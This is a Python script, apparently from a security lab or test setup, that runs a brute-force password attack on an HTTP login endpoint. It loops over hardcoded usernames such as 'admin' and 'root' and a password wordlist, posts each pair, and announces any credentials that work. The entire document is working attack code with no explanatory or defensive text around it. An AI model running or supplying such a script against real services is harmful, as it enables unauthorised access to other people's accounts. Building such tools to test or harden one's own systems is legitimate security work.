import time
import requests

from config import HTTP_HOST, HTTP_PORT


USERNAMES = [
    "admin",
    "alexei",
    "john",
    "root",
    "user",
]


def run_attack():
    url = f"http://{HTTP_HOST}:{HTTP_PORT}/api/auth/login"

    with open("wordlists/passwords.txt") as file:
        passwords = [
            password.strip()
            for password in file
            if password.strip()
        ]

    for username in USERNAMES:
        for password in passwords:

            print(f"Trying: {username}:{password}")

            result = requests.post(
                url,
                json={
                    "username": username,
                    "password": password,
                },
            )

            yield result

            if result.status_code == 200:
                print(f"[+] Credentials found: {username}:{password}")
                break

            time.sleep(1)


if __name__ == "__main__":
    for result in run_attack():
        print(f"Response: {result.status_code} | {result.text}")